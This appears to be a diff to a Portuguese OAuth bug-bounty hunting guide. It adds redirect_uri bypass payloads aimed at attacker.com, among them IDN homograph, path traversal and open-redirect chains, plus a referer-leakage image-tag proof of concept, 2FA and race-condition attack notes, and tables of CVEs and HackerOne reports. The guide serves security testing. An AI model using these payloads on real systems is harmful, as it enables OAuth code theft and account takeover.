@@ -82,7 +82,35 @@ Variações de bypass de WAF/filtros:
 - Case: HTTPS://ALVO.COM@EVIL.COM
 ```
 
-Casos reais e mentalidade de ataque (RWBH): Facebook, Uber e Twitter ilustram os três padrões mais recorrentes -- `redirect_uri` permissivo, `state` ausente e vazamento de token em URLs/Referer.
+HackerOne intel (tecnicas avancadas):
+```text
+-- IDN homograph redirect_uri bypass (H1: Semrush #861940, 265 upvotes)
+-- Cyrillic 'а' (U+0430) no lugar de Latin 'a' (U+0061)
+redirect_uri=https://tаrget.com/callback
+
+-- Path traversal em redirect_uri (H1: GSA Bounty #665651, 67 upvotes)
+redirect_uri=https://target.com/callback/../../../attacker.com
+redirect_uri=https://target.com/callback/..%2F..%2Fattacker.com
+
+-- Fragment-based bypass
+redirect_uri=https://target.com/callback#@attacker.com
+
+-- Open redirect chain para roubo de OAuth code (H1: Uber #202781, 427 upvotes)
+redirect_uri=https://target.com/redirect?url=https://attacker.com
+
+-- Subdomain takeover chain (H1: Shopify #740989, 527 upvotes)
+redirect_uri=https://abandoned-subdomain.target.com/callback
+
+-- OAuth code theft via referer leakage (H1: Rockstar Games, 4 reports, 420+ upvotes)
+-- Callback page carrega recursos externos (imagens/scripts CDN)
+-- Authorization code no ?code= vaza via header Referer para servidor externo
+-- PoC: injetar imagem no dominio da callback: <img src="https://attacker.com/pixel.gif">
+
+-- Forced OAuth authorization via UI bypass (H1: LinkedIn #2649615, 79 upvotes)
+-- Exploitar button ID no hash + segurar espaco para forcar autorizacao
+```
+
+Casos reais e mentalidade de ataque (RWBH): Facebook, Uber e Twitter ilustram os tres padroes mais recorrentes -- `redirect_uri` permissivo, `state` ausente e vazamento de token em URLs/Referer. Shopify (527 upvotes) mostra OAuth misconfiguration em apps first-party. Rockstar Games (4 reports) demonstra que referer leakage e um vetor subestimado. Semrush (265 upvotes) prova que IDN homograph bypassa validacao de dominios.
 
 ## Target Context (Crawler Hints)
 - **Parâmetros comuns:** `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `nonce`, `code`, `access_token`, `id_token`, `refresh_token`, `grant_type`, `code_verifier`.
@@ -95,7 +123,13 @@ Casos reais e mentalidade de ataque (RWBH): Facebook, Uber e Twitter ilustram os
 - **CSRF no login:** sem `state`, atacante forca vitima a logar com conta do atacante (login CSRF) para capturar dados inseridos pela vitima.
 - **Scope escalation:** testar se o authorization server permite ampliar `scope` alem do permitido pelo client registration.
 - **Token reuse:** access tokens sem audience (`aud`) restriction podem ser usados em outros servicos que confiam no mesmo IdP.
-- **Chaining com open redirect:** open redirect no dominio do client permite bypass de redirect_uri validation para exfiltrar codes/tokens.
+- **Chaining com open redirect:** open redirect no dominio do client permite bypass de redirect_uri validation para exfiltrar codes/tokens. H1: Uber #202781 (427 upvotes) -- chain com Facebook OAuth para roubar token; CS Money #905607 (356 upvotes); LY Corp #3423013 ($1K).
+- **OAuth -> ATO via referer leakage** -- Pagina de callback carrega recursos externos (imagens, scripts, CDN) e o authorization code vaza no header Referer para servidor do atacante. Especialmente efetivo quando a callback page tem conteudo dinamico ou user-generated. H1: Rockstar Games #488269 (200 upvotes), #787160 (112 upvotes), #482743 (71 upvotes), #342709 (39 upvotes).
+- **SSO bypass de 2FA** -- Sign in with Apple/Google/GitLab cria sessao que bypassa requisito de 2FA existente na conta. O IdP autentica o usuario mas o service provider nao re-verifica 2FA. H1: Cloudflare #1593404 ($1K, 32 upvotes).
+- **Race condition no token exchange** -- Requests concorrentes de token exchange podem ser exploradas para obter multiplos access tokens a partir de um unico authorization code, ou reusar codes que deveriam ser single-use. H1: IBB #55140 (51 upvotes); Razer #699112 ($250).
+- **IDN homograph redirect_uri** -- Dominio Unicode confundivel com dominio real (ex.: Cyrillic 'а' vs Latin 'a') passa validacao de redirect_uri quando o server nao normaliza Unicode antes de comparar. H1: Semrush #861940 (265 upvotes).
+- **Email verification bypass -> ATO em third parties** -- Criar conta no IdP com email da vitima sem verificacao, depois usar OAuth para logar em servicos que confiam no IdP. H1: GitLab #922456 ($3K, 257 upvotes).
+- **First-party app OAuth misconfiguration** -- Apps first-party com redirect_uri permissivo ou privilegios excessivos. H1: Shopify Stocky #740989 (527 upvotes).
 
 ## Hunting Methodology
 1. Testar `redirect_uri` manipulation: subdomains (`sub.attacker.com`), path traversal (`/../attacker`), userinfo (`attacker.com@legitimate.com`), schema (`http` vs `https`).
@@ -110,6 +144,36 @@ Casos reais e mentalidade de ataque (RWBH): Facebook, Uber e Twitter ilustram os
 - `state` presente e vinculado a sessao -- CSRF no OAuth esta protegido.
 - PKCE habilitado com `S256` -- code interception nao e viavel.
 - Implicit flow desabilitado e todos os tokens sao entregues via backend (authorization code flow) -- token nao vaza para browser.
+- Authorization code e single-use e vinculado ao client -- race condition no token exchange nao e viavel.
+- Callback page nao carrega recursos de dominios externos -- referer leakage de codes nao ocorre.
+- IdP normaliza Unicode/IDN antes de validar redirect_uri -- homograph attack nao funciona.
+- 2FA e re-verificado apos login via SSO -- bypass de 2FA via IdP nao e possivel.
+
+## Notable CVEs
+
+| CVE | Produto | Ano | Descricao | Tipo |
+|-----|---------|-----|-----------|------|
+| CVE-2025-4143 | Cloudflare workers-oauth-provider | 2025 | Validacao insuficiente de redirect_uri permite roubo de authorization code em clients OAuth | redirect_uri Bypass |
+| CVE-2023-6291 | Keycloak | 2023 | Bypass de validacao de redirect_uri permite roubo de access token via dominio controlado pelo atacante | redirect_uri Bypass |
+| CVE-2023-28131 | Expo AuthSession (React Native) | 2023 | Open redirect na callback AuthSession permite roubo de OAuth token -- redirect_uri sem validacao adequada | OAuth Token Theft |
+| CVE-2023-27490 | NextAuth.js | 2023 | CSRF na callback OAuth permite fixacao de sessao e account takeover em aplicacoes Next.js | OAuth CSRF |
+| CVE-2020-15234 | ORY Fosite (Go OAuth2 SDK) | 2020 | Validacao de redirect_uri por prefixo permite roubo de authorization code via path traversal | redirect_uri Bypass |
+| CVE-2016-4977 | Spring Security OAuth2 | 2016 | RCE via injecao SpEL no endpoint de approval do fluxo OAuth2 -- atacante executa codigo arbitrario | OAuth Endpoint RCE |
+
+## Notable HackerOne Reports
+
+| Report | Programa | Upvotes | Bounty | Tecnica |
+|--------|----------|---------|--------|---------|
+| #740989 | Shopify | 527 | $0 | First-party app OAuth misconfiguration (Stocky) |
+| #202781 | Uber | 427 | $0 | Chain: open redirect + Facebook OAuth -> token theft |
+| #110293 | X/xAI | 276 | $0 | Callback validation insuficiente -> ATO Periscope |
+| #861940 | Semrush | 265 | $0 | IDN homograph redirect_uri bypass |
+| #922456 | GitLab | 257 | $3,000 | Email verification bypass -> ATO em third parties |
+| #1861974 | pixiv | 253 | $2,000 | Roubo de authorization code via redirect_uri |
+| #398799 | GitLab | 238 | $4,000 | Blind SSRF no controller de autorizacao OAuth Jira |
+| #488269 | Rockstar | 200 | $0 | Facebook OAuth code theft via screenshot viewer |
+| #787160 | Rockstar | 112 | $0 | Referer leakage -> Facebook OAuth token theft |
+| #55140 | IBB | 51 | $0 | Race conditions em implementacoes OAuth 2 |
 
 ## Recommendation
 1. Exigir `state` criptograficamente aleatório, vinculado à sessão e de uso único; rejeitar requisições sem `state`.
